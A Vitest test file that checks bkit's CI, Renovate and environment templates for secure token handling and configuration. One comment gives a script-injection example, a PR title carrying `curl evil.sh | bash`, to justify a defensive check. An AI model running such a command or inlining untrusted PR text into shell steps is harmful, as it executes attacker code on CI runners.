// bkit-templates-content.test.ts — Snapshot/diff tests for seeded template files.
// (BAR-138: verifies consumer CI template has been updated for registry-based auth)
// Sibling of bkit-templates.test.ts which enforces marker PRESENCE; this file
// enforces template CONTENT (BKIT_GH_TOKEN_INSTALL, renovate baseBranchPatterns, etc.).

import * as fs from "node:fs";
import * as path from "node:path";
import { describe, expect, it } from "vitest";
import { isTemplate } from "./bkit-modules";
import { listFilesRecursive } from "./bkit-install";
import { BKIT_GATE_SCRIPTS, LINT_PROSE_SCRIPT, SLOP_DELTA_SCRIPT } from "./bkit-manifest";

const CONSUMER_CI_TEMPLATE = path.resolve(".bkit/templates/.github/workflows/ci.yml");
const CONSUMER_PRETTIERIGNORE_TEMPLATE = path.resolve(".bkit/templates/.prettierignore");
const CONSUMER_RENOVATE_TEMPLATE = path.resolve(".bkit/templates/.github/renovate.json5");

describe("consumer CI template (.bkit/templates/.github/workflows/ci.yml)", () => {
  let content: string;
  content = fs.readFileSync(CONSUMER_CI_TEMPLATE, "utf-8");

  it("template file exists", () => {
    expect(fs.existsSync(CONSUMER_CI_TEMPLATE)).toBe(true);
  });

  it("does NOT contain Configure private-repo auth step", () => {
    expect(content).not.toContain("Configure private-repo auth");
  });

  it("does NOT contain insteadOf git auth-shim", () => {
    expect(content).not.toContain("insteadOf");
    expect(content).not.toContain("git config --global url.");
  });

  it("install step carries env: BKIT_GH_TOKEN_INSTALL block", () => {
    expect(content).toContain("BKIT_GH_TOKEN_INSTALL: ${{ secrets.BKIT_GH_TOKEN_INSTALL }}");
  });

  it("env: BKIT_GH_TOKEN_INSTALL appears under the install step (after pnpm install --frozen-lockfile)", () => {
    // Note: BKIT_GH_TOKEN_INSTALL is declared at BOTH job-level (so subsequent pnpm/npx
    // steps don't emit ".npmrc env substitution failed" warnings) AND at the
    // install step itself (explicit, plus required by the BAR-138 contract).
    // This assertion locates the step-level declaration adjacent to the install
    // command, ignoring any earlier job-level occurrence.
    const lines = content.split("\n");
    const installLineIdx = lines.findIndex((l) => l.includes("pnpm install --frozen-lockfile"));
    const envTokenIdx = lines.findIndex(
      (l, i) =>
        i > installLineIdx &&
        l.includes("BKIT_GH_TOKEN_INSTALL: ${{ secrets.BKIT_GH_TOKEN_INSTALL }}"),
    );
    expect(installLineIdx).toBeGreaterThan(-1);
    expect(envTokenIdx).toBeGreaterThan(installLineIdx);
    // Must be within the next 3 lines (env: block is directly under run:)
    expect(envTokenIdx - installLineIdx).toBeLessThanOrEqual(3);
  });

  it("still contains pnpm install --frozen-lockfile", () => {
    expect(content).toContain("pnpm install --frozen-lockfile");
  });

  it("still contains token placeholders {{DEFAULT_BRANCH}} and {{NODE_VERSION}}", () => {
    expect(content).toContain("{{DEFAULT_BRANCH}}");
    expect(content).toContain("{{NODE_VERSION}}");
  });

  describe("[verbose ci] NODE_OPTIONS knob", () => {
    // The runner blocklists NODE_OPTIONS for the $GITHUB_ENV workflow command and REJECTS
    // the write with an ::error:: while still concluding the step `success` — so the shape
    // below ships a knob that reaches nothing on a run that goes green. Only static YAML
    // works. These two assertions are a pair: deleting the rejected write on its own would
    // leave the lanes quiet AND knob-less, which is worse than the bug, because the error
    // annotation was the only thing pointing at it.
    it("never writes NODE_OPTIONS to $GITHUB_ENV", () => {
      const offenders = content
        .split("\n")
        .filter((l) => /NODE_OPTIONS\s*=/.test(l) && l.includes("GITHUB_ENV"));
      expect(offenders).toEqual([]);
    });

    it("every job declaring VERBOSE_CI also declares a marker-gated job-level NODE_OPTIONS", () => {
      // Derived, not hand-listed: the lane set comes from the VERBOSE_CI declarations
      // themselves, so a lane added later is covered without editing this test.
      const verboseLanes = content
        .split("\n")
        .filter((l) => /^\s+VERBOSE_CI:\s*\$\{\{/.test(l)).length;
      const nodeOptionKeys = content
        .split("\n")
        .filter(
          (l) =>
            /^\s+NODE_OPTIONS:\s*\$\{\{/.test(l) &&
            l.includes("[verbose ci]") &&
            l.includes("--trace-warnings"),
        ).length;
      expect(verboseLanes).toBeGreaterThan(0);
      expect(nodeOptionKeys).toBe(verboseLanes);
    });

    it("gates NODE_OPTIONS on the spelled-out contains() test, not env.VERBOSE_CI", () => {
      // The `env` context is not available to a job-level `env:` value, so
      // `env.VERBOSE_CI` there resolves empty on every run — no flags, no error, no signal.
      const nodeOptionLines = content
        .split("\n")
        .filter((l) => /^\s+NODE_OPTIONS:\s*\$\{\{/.test(l));
      expect(nodeOptionLines.length).toBeGreaterThan(0);
      for (const line of nodeOptionLines) {
        expect(line).not.toMatch(/env\.VERBOSE_CI/);
        expect(line).toContain("contains(github.event.head_commit.message, '[verbose ci]')");
      }
    });
  });

  describe("Check Default Branch Lags Dev step (promotion-lag warning)", () => {
    it("ships the Check Default Branch Lags Dev step", () => {
      expect(content).toContain("- name: Check Default Branch Lags Dev");
    });

    it("fires only on dev pushes (not PRs, not other branches)", () => {
      // The step's if: gates on a push to dev — that's the moment main starts
      // to lag. Matching the exact guard keeps it from firing on PRs / feature pushes.
      expect(content).toMatch(
        /Check Default Branch Lags Dev[\s\S]*?if:[^\n]*github\.event_name == 'push'[^\n]*github\.ref == 'refs\/heads\/dev'/,
      );
    });

    it("keys ONLY on consumed-from-default-branch surfaces (renovate config + workflows)", () => {
      // The trigger is the stale-consumed-surface set, not any dev-ahead-of-main —
      // so ordinary app-code dev pushes stay quiet.
      const step =
        content.match(
          /- name: Check Default Branch Lags Dev[\s\S]*?(?=\n      - name:|\n      #)/,
        )?.[0] ?? "";
      expect(step).toContain(".github/renovate.json5");
      expect(step).toContain(".github/workflows");
      expect(step).toMatch(/git diff --name-only "origin\/\$DEFAULT_BRANCH" HEAD/);
    });

    it("is token-free (default branch read at runtime, so the block is identical per repo)", () => {
      // No bkit {{TOKEN}} inside the block — otherwise install would render it and the
      // managed-block drift check would false-positive on every consumer. The default
      // branch comes from the Actions context at runtime instead.
      const block =
        content.match(/# bkit:start main-lag-warning\n[\s\S]*?# bkit:end main-lag-warning/)?.[0] ??
        "";
      expect(block).toContain("- name: Check Default Branch Lags Dev");
      expect(block).toContain("DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}");
      expect(block).not.toMatch(/\{\{[A-Z_]+\}\}/);
    });

    it("is non-blocking — warns via ::warning:: and never exits non-zero", () => {
      const step =
        content.match(
          /- name: Check Default Branch Lags Dev[\s\S]*?(?=\n      - name:|\n      #)/,
        )?.[0] ?? "";
      expect(step).toContain("::warning::");
      // No `exit 1` (or any non-zero exit) — the step is a nudge, not a gate.
      expect(step).not.toMatch(/exit [1-9]/);
    });
  });

  it("ships the bkit-stub:coverage block commented, per-tier (unit + integration reports)", () => {
    // The sentinel must exist for the BKIT_STUBS advisory to fire, and BOTH per-tier report
    // steps must ship COMMENTED (opt-in) so installing the scaffold can never red an existing repo.
    expect(content).toContain("# bkit-stub:coverage");
    expect(content).toContain("davelosert/vitest-coverage-report-action");
    expect(content).toContain("# - name: Report Unit Coverage on PR");
    expect(content).toContain("# - name: Report Integration Coverage on PR");
    // Neither is an ACTIVE (uncommented) step — that would run coverage before the consumer
    // opts in (and without the required json-summary/json reporters + permissions).
    expect(content).not.toMatch(/^\s*- name: Report (Unit|Integration) Coverage on PR/m);
  });

  it("ships the bkit-stub:e2e-coverage block commented (Playwright E2E coverage report)", () => {
    // Sentinel must exist for the bkit-stub-e2e-coverage advisory to fire, and the report step
    // must ship COMMENTED (opt-in) — Playwright needs a collect+report pipeline the consumer wires.
    expect(content).toContain("# bkit-stub:e2e-coverage");
    expect(content).toContain("# - name: Report E2E Coverage on PR");
    // Reuses the same commenter as bkit-stub:coverage, keyed to a distinct e2e sticky comment.
    expect(content).toContain("davelosert/vitest-coverage-report-action");
    // Not an ACTIVE (uncommented) step — it must never run before the consumer opts in.
    expect(content).not.toMatch(/^\s*- name: Report E2E Coverage on PR/m);
  });

  it("ships the gether lane-name stubs (web, device, reset, deploy, health)", () => {
    for (const sentinel of [
      "# bkit-stub:bkit-tests-integration —",
      "# bkit-stub:bkit-tests-e2e-web —",
      "# bkit-stub:bkit-tests-build-web —",
      "# bkit-stub:bkit-tests-live-web —",
      "# bkit-stub:bkit-tests-build-ios —",
      "# bkit-stub:bkit-tests-e2e-ios —",
      "# bkit-stub:bkit-tests-build-android —",
      "# bkit-stub:bkit-tests-e2e-android —",
      "# bkit-stub:bkit-tests-reset —",
      "# bkit-stub:bkit-tests-cleanup —",
      "# bkit-stub:logging-probe —",
      "# bkit-stub:bkit-tests-deploy —",
      "# bkit-stub:health —",
    ]) {
      expect(content).toContain(sentinel);
    }
  });

  it("never inlines a PR title into a run: body (GitHub Actions script injection)", () => {
    // A `${{ github.event.pull_request.title }}` expanded into shell text lets a PR titled
    // `"; curl evil.sh | bash; "` run on the consumer's CI runner. User-controlled text MUST
    // arrive via env: (runtime expansion, injection-safe). Guards the snapshot below from
    // silently re-blessing a reintroduced inline interpolation.
    expect(content).not.toMatch(/MSG="\$\{\{\s*github\.event\.pull_request\.title\s*\}\}"/);
    expect(content).toContain("PR_TITLE: ${{ github.event.pull_request.title }}");
    expect(content).toMatch(/MSG="\$PR_TITLE"/);
  });

  it("snapshot matches expected template content (regression guard)", () => {
    expect(content).toMatchSnapshot();
  });
});

describe("consumer renovate template (.bkit/templates/.github/renovate.json5)", () => {
  const content = fs.readFileSync(CONSUMER_RENOVATE_TEMPLATE, "utf-8");

  it("template file exists", () => {
    expect(fs.existsSync(CONSUMER_RENOVATE_TEMPLATE)).toBe(true);
  });

  it("targets the dev branch (required for bkit branch-protection convention)", () => {
    // Match either `baseBranchPatterns: ["dev"]` (one-line) or multiline; allow trailing comma.
    expect(content).toMatch(/baseBranchPatterns:\s*\[\s*"dev"\s*,?\s*\]/);
  });

  it("merges base-branch config so dev-side renovate.json5 edits take effect", () => {
    // Without useBaseBranchConfig, Renovate reads config ONLY from the default
    // branch (main) — config edits on `dev` are silently ignored.
    expect(content).toMatch(/useBaseBranchConfig:\s*"merge"/);
  });

  it("ships chore(deps): commit-message prefix to match conventional-commit history", () => {
    expect(content).toMatch(/commitMessagePrefix:\s*"chore\(deps\):"/);
  });

  it("extends Renovate's config:recommended baseline", () => {
    expect(content).toMatch(/"config:recommended"/);
  });

  it("does not extend a renovate-local preset (the copy is the whole config)", () => {
    expect(content).not.toMatch(/renovate-local/);
    expect(content).not.toMatch(/\{\{REPO_SLUG\}\}/);
  });

  it("enables osvVulnerabilityAlerts (CVE-driven PRs bypass schedule)", () => {
    expect(content).toMatch(/osvVulnerabilityAlerts:\s*true/);
  });

  it("enables lockFileMaintenance with weekly schedule", () => {
    expect(content).toMatch(/lockFileMaintenance:/);
    expect(content).toMatch(/enabled:\s*true/);
  });

  it("ships the pnpm-11 OOM mitigation: worker-cap env + Renovate minimumReleaseAge (#308)", () => {
    // Large pnpm-11 monorepos OOM Mend's microvm on `pnpm update --lockfile-only`
    // when the per-install release-age gate verifies timestamps for every entry.
    // (A) Cap pnpm's worker pool — PNPM_WORKERS/PNPM_MAX_WORKERS are allow-listed
    // by Mend's global:safeEnv preset, so no admin `allowedEnv` change is needed.
    expect(content).toMatch(
      /env:\s*\{[\s\S]*?PNPM_WORKERS:\s*"1"[\s\S]*?PNPM_MAX_WORKERS:\s*"1"[\s\S]*?\}/,
    );
    // (B) Enforce release-age freshness in Renovate (no per-install verification).
    // Security / osvVulnerabilityAlerts PRs bypass this by design → no CVE delay.
    expect(content).toMatch(/minimumReleaseAge:\s*"1 day"/);
  });

  it("does not fence renovate.yml (the consumer owns that runner)", () => {
    expect(content).not.toMatch(/"\.github\/workflows\/renovate\.yml"/);
  });

  it("does not fence bkit-cloud.yml (a template the consumer owns, so its pins refresh)", () => {
    expect(content).not.toMatch(/"\.github\/workflows\/bkit-cloud\.yml"/);
  });

  it("ignores the bkit-owned mirror trees so Renovate doesn't scan them (#132)", () => {
    // `.bkit/templates/**` and `.agents/skills/**` are bkit-owned files NOT managed
    // by consumer Renovate; scanning them only produces onboarding noise.
    expect(content).toMatch(/ignorePaths:[\s\S]*"\.bkit\/templates\/\*\*"/);
    expect(content).toMatch(/ignorePaths:[\s\S]*"\.agents\/skills\/\*\*"/);
  });

  it("disables Renovate for the @cbartens/bkit package itself (#132)", () => {
    // bkit upgrades via `bkit upgrade`, not a bare version bump; the package is also
    // restricted on GitHub Packages (unauthable from Mend → "no-result").
    expect(content).toMatch(
      /matchPackageNames:\s*\[\s*"@cbartens\/bkit"\s*\][\s\S]*enabled:\s*false/,
    );
  });

  it("ignores the bkit-owned mirror trees so Renovate doesn't scan them (#132)", () => {
    // `.bkit/templates/**` and `.agents/skills/**` are bkit-owned files NOT managed
    // by consumer Renovate; scanning them only produces onboarding noise.
    expect(content).toMatch(/ignorePaths:[\s\S]*"\.bkit\/templates\/\*\*"/);
    expect(content).toMatch(/ignorePaths:[\s\S]*"\.agents\/skills\/\*\*"/);
  });

  it("disables Renovate for the @cbartens/bkit package itself (#132)", () => {
    // bkit upgrades via `bkit upgrade`, not a bare version bump; the package is also
    // restricted on GitHub Packages (unauthable from Mend → "no-result").
    expect(content).toMatch(
      /matchPackageNames:\s*\[\s*"@cbartens\/bkit"\s*\][\s\S]*enabled:\s*false/,
    );
  });

  it("uses pinDigests for the github-actions manager (KN-3 SHA-pinning)", () => {
    expect(content).toMatch(/matchManagers:\s*\[\s*"github-actions"\s*\][\s\S]*pinDigests:\s*true/);
  });

  it("collapses auto-mergeable non-major bumps into one shared group with automerge", () => {
    // devDeps non-major + prod patch + @types + eslint share a single
    // groupName so they land in ONE PR — every Renovate PR rewrites
    // pnpm-lock.yaml, so several auto-merge PRs in the same window force a
    // serial rebase cascade. One group = one lockfile mutation = no cascade.
    expect(content).toMatch(
      /matchDepTypes:\s*\[\s*"devDependencies"\s*\][\s\S]*?groupName:\s*"non-major dependencies"[\s\S]*?automerge:\s*true/,
    );
    // Old per-type group names are gone — proof the four collapsed into one.
    expect(content).not.toMatch(/groupName:\s*"devDependencies \(non-major\)"/);
    expect(content).not.toMatch(/groupName:\s*"type definitions"/);
    expect(content).not.toMatch(/groupName:\s*"linters \(eslint\)"/);
  });

  it("scopes multi-package ecosystem groups to majors only (non-majors fold into the unified group)", () => {
    // vitest/playwright/tanstack non-major bumps ride the unified auto-merge PR;
    // only a coordinated MAJOR bump gets a dedicated lockstep PR (reviewed,
    // never auto-merged). Guards against regressing to separate-named ecosystem
    // groups that auto-merge non-majors and re-enter the lockfile cascade.
    expect(content).toMatch(
      /matchPackageNames:\s*\[\s*"vitest\*"[\s\S]*?matchUpdateTypes:\s*\[\s*"major"\s*\][\s\S]*?automerge:\s*false/,
    );
    // The bare auto-merging ecosystem group names must not reappear.
    expect(content).not.toMatch(/groupName:\s*"vitest"\s*,/);
    expect(content).not.toMatch(/groupName:\s*"playwright"\s*,/);
  });

  it("declares weekly schedule (before 6am on Monday)", () => {
    expect(content).toMatch(/schedule:\s*\[\s*"before 6am on Monday"\s*\]/);
  });

  it("references the JSON schema for editor validation", () => {
    expect(content).toMatch(
      /\$schema:\s*"https:\/\/docs\.renovatebot\.com\/renovate-schema\.json"/,
    );
  });

  it("keeps the hostRules token commented so self-hosted env auth is not doubled", () => {
    expect(content).not.toMatch(/^\s*hostRules:/m);
    expect(content).toMatch(/\/\/\s*hostRules:/);
  });
});

describe("self-hosted renovate workflow template (.bkit/templates/.github/workflows/renovate.yml) (#325)", () => {
  const WORKFLOW = path.resolve(".bkit/templates/.github/workflows/renovate.yml");
  const content = fs.readFileSync(WORKFLOW, "utf-8");

  it("template file exists", () => {
    expect(fs.existsSync(WORKFLOW)).toBe(true);
  });

  it("runs renovatebot/github-action SHA-pinned (KN-CORE-5) on the configurable runner (#362)", () => {
    expect(content).toMatch(/uses:\s*renovatebot\/github-action@[0-9a-f]{40}\s*#/);
    expect(content).toMatch(/runs-on:\s*ubuntu-latest/);
    expect(content).not.toMatch(/\{\{RENOVATE_RUNNER\}\}/);
  });

  it("wires RENOVATE_GIT_AUTHOR from a repo variable (portable commit author for org repos)", () => {
    // Org-owned fine-grained PATs have no Email-addresses permission, so Renovate can't
    // read the token owner's email; the repo variable supplies the git author instead.
    expect(content).toMatch(/RENOVATE_GIT_AUTHOR:\s*\$\{\{\s*vars\.RENOVATE_GIT_AUTHOR\s*\}\}/);
  });

  it("wakes on a schedule cron + workflow_dispatch (logLevel / dryRun inputs)", () => {
    expect(content).toMatch(/schedule:/);
    expect(content).toMatch(/cron:/);
    expect(content).toMatch(/workflow_dispatch:/);
    expect(content).toMatch(/logLevel:/);
    expect(content).toMatch(/dryRun:/);
  });

  it("serialises runs (concurrency group, no cancel-in-progress)", () => {
    expect(content).toMatch(/concurrency:/);
    expect(content).toMatch(/cancel-in-progress:\s*false/);
  });

  it("authenticates with BKIT_GH_TOKEN, never the default GITHUB_TOKEN", () => {
    // GITHUB_TOKEN-opened PRs don't trigger CI, so platformAutomerge never fires (#325).
    expect(content).toMatch(/token:\s*\$\{\{\s*secrets\.BKIT_GH_TOKEN\s*\}\}/);
    expect(content).not.toMatch(/token:\s*\$\{\{\s*secrets\.GITHUB_TOKEN\s*\}\}/);
    expect(content).not.toMatch(/token:\s*\$\{\{\s*github\.token\s*\}\}/);
  });

  it("injects private-registry auth via RENOVATE_HOST_RULES from BKIT_GH_TOKEN_INSTALL", () => {
    expect(content).toMatch(/RENOVATE_HOST_RULES:/);
    expect(content).toMatch(/npm\.pkg\.github\.com/);
    expect(content).toMatch(/secrets\.BKIT_GH_TOKEN_INSTALL/);
  });

  it("scopes to this repo only (no org-wide autodiscover)", () => {
    expect(content).toMatch(/RENOVATE_REPOSITORIES:\s*\$\{\{\s*github\.repository\s*\}\}/);
    expect(content).toMatch(/RENOVATE_AUTODISCOVER:\s*"false"/);
  });

  it("allow-lists the PNPM_* env so renovate.json5's env block is not rejected (allowedEnv)", () => {
    // renovate.json5 sets env: { PNPM_WORKERS, PNPM_MAX_WORKERS }; allowedEnv is a
    // global-only option, so without this the self-hosted bot rejects the whole config.
    expect(content).toMatch(/RENOVATE_ALLOWED_ENV:\s*"PNPM_\*"/);
  });

  it("never INJECTS model/tracker secrets into the runner (security.md § token isolation)", () => {
    // The names may appear in a "do NOT add these" comment, but must never be
    // referenced as `secrets.*` (which would expose them to the Renovate runner).
    expect(content).not.toMatch(/secrets\.ANTHROPIC_API_KEY/);
    expect(content).not.toMatch(/secrets\.BKIT_ANTHROPIC_API_KEY/);
    expect(content).not.toMatch(/secrets\.LINEAR_API_KEY/);
    expect(content).not.toMatch(/secrets\.BKIT_LINEAR_API_KEY/);
  });

  it("uses least-privilege job permissions (contents: read)", () => {
    expect(content).toMatch(/permissions:\s+contents:\s*read/);
  });
});

describe("example dependabot template (.bkit/templates/.github/dependabot.yml)", () => {
  const content = fs.readFileSync(path.resolve(".bkit/templates/.github/dependabot.yml"), "utf-8");

  it("does not exclude bkit-cloud.yml (a template the consumer owns, so its pins refresh)", () => {
    expect(content).not.toMatch(/exclude-paths:[\s\S]*bkit-cloud\.yml/);
  });
});

describe(".bkit/.env.example keys are BKIT_-prefixed (direnv isolation)", () => {
  const ENV_EXAMPLE = path.resolve(".bkit/templates/.bkit/.env.example");
  const content = fs.readFileSync(ENV_EXAMPLE, "utf-8");
  const assigned = [...content.matchAll(/^([A-Z][A-Z0-9_]*)=/gm)].map((m) => m[1]);

  it("assigns BKIT_GH_TOKEN and BKIT_GH_TOKEN_INSTALL, not GH_BKIT_*", () => {
    expect(assigned).toContain("BKIT_GH_TOKEN");
    expect(assigned).toContain("BKIT_GH_TOKEN_INSTALL");
    expect(assigned).not.toContain("GH_BKIT_TOKEN");
    expect(assigned).not.toContain("GH_BKIT_TOKEN_INSTALL");
  });

  it("every assigned key starts with BKIT_", () => {
    expect(assigned.length).toBeGreaterThan(0);
    expect(assigned.filter((k) => !k.startsWith("BKIT_"))).toEqual([]);
  });

  it("vendor API keys are BKIT_-prefixed", () => {
    for (const key of [
      "BKIT_LINEAR_API_KEY",
      "BKIT_ANTHROPIC_API_KEY",
      "BKIT_CURSOR_API_KEY",
      "BKIT_OPENCODE_API_KEY",
      "BKIT_OPENROUTER_API_KEY",
      "BKIT_OLLAMA_API_KEY",
      "BKIT_TAVILY_API_KEY",
    ]) {
      expect(assigned).toContain(key);
    }
    expect(assigned).not.toContain("LINEAR_API_KEY");
    expect(assigned).not.toContain("ANTHROPIC_API_KEY");
    expect(assigned).not.toContain("OPENCODE_API_KEY");
  });
});

describe("consumer .prettierignore template (.bkit/templates/.prettierignore)", () => {
  const content = fs.readFileSync(CONSUMER_PRETTIERIGNORE_TEMPLATE, "utf-8");

  it("template file exists", () => {
    expect(fs.existsSync(CONSUMER_PRETTIERIGNORE_TEMPLATE)).toBe(true);
  });

  it("contains the bkit-managed block markers", () => {
    expect(content).toContain("# bkit:start");
    expect(content).toContain("# bkit:end");
  });
});

describe("templates", () => {
  const root = path.resolve(".bkit/templates");

  // JSON has no comment syntax; `.bkit/templates.md` covers those.
  it("every template that can carry a comment says it is an example bkit install does not write", () => {
    const templates = listFilesRecursive(root)
      .map((abs) => path.relative(root, abs))
      .filter((rel) => isTemplate(rel) && !rel.endsWith(".json"));
    expect(templates).toContain(path.join(".github", "workflows", "ci.yml"));
    for (const rel of templates) {
      const text = fs.readFileSync(path.join(root, rel), "utf-8");
      expect(text, rel).toMatch(/Example/);
      expect(text, rel).toMatch(/does not write this file|does not write it/);
    }
  });

  it("ships the code-graph scripts without a bkit managed block", () => {
    for (const rel of [
      "scripts/graphify/bkit-graphify.sh",
      "scripts/graphify/bkit-graphify-rollup.py",
      "scripts/serena/bkit-serena-mcp.sh",
      "scripts/secrets/bkit-secrets.mjs",
      "scripts/secrets/bkit-secrets.config.mjs",
      "scripts/prettier/bkit-insert-ignore.mjs",
      "scripts/graphify/bkit-graph-drift-rules.json",
      ".graphifyignore",
      ".serena/project.yml",
      "docs/capabilities.md",
    ]) {
      expect(fs.readFileSync(path.join(root, rel), "utf-8"), rel).not.toMatch(/bkit:start/);
    }
  });

  it("keeps capability rules as a starter, not a product register", () => {
    const rules = fs.readFileSync(
      path.join(root, "scripts/graphify/bkit-graph-drift-rules.json"),
      "utf-8",
    );
    expect(rules).toContain("new ExampleClient(");
    expect(rules).not.toContain("family_members");
    expect(rules).not.toContain("app-gether-life");
  });

  it("generates capabilities.md and Mermaid from the wrapper", () => {
    const sh = fs.readFileSync(path.join(root, "scripts/graphify/bkit-graphify.sh"), "utf-8");
    expect(sh).toContain('CAPABILITIES_DOC="docs/capabilities.md"');
    expect(sh).toContain("R_PACKAGES_MMD");
    expect(sh).toContain("R_MODULES_MMD");
    expect(sh).toContain("--code-only");
  });
});

describe(".bkit/templates.md gate tool scripts (consumers copy and run them)", () => {
  const doc = fs.readFileSync(path.resolve(".bkit/templates.md"), "utf-8");
  const section = doc.slice(doc.indexOf("## Gate tool scripts"));
  const block = /```json\n([\s\S]*?)\n```/.exec(section);
  const scripts = JSON.parse(block?.[1] ?? "{}") as Record<string, string>;

  it("lists the same lint:prose and slop:delta values install re-points legacy copies to", () => {
    expect(scripts["lint:prose"]).toBe(LINT_PROSE_SCRIPT);
    expect(scripts["slop:delta"]).toBe(SLOP_DELTA_SCRIPT);
  });

  it("lists the lint value this repo runs", () => {
    const pkg = JSON.parse(fs.readFileSync(path.resolve("package.json"), "utf-8")) as {
      scripts: Record<string, string>;
    };
    expect(scripts["lint"]).toBe(pkg.scripts["lint"]);
  });

  it("lists every script the default gates chain, except test and build", () => {
    const chained = new Set<string>();
    for (const [gate, value] of Object.entries(BKIT_GATE_SCRIPTS)) {
      if (!gate.startsWith("bkit:gate:")) continue;
      for (const m of value.matchAll(/pnpm ([\w:-]+)/g)) chained.add(m[1]);
    }
    const external = new Set(["install", "test", "build", "lint-staged"]);
    const missing = [...chained].filter(
      (name) => !name.startsWith("bkit:gate:") && !external.has(name) && !(name in scripts),
    );
    expect(missing).toEqual([]);
  });
});
